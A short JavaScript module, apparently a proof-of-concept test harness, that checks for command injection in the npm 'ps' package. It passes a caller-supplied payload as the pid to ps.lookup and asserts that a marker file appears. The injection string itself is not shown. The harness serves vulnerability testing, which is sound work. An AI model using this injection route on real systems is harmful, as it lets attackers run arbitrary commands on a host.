function exploitFunction(payload) {
  const ps = require("ps");
  const fs = require("fs");
  const path = "./ps";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  ps.lookup({ pid: payload }, function (err, proc) {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      if (err) {
        console.error("Error removing file:", err);
      }
    });
  });
}

module.exports = { exploitFunction };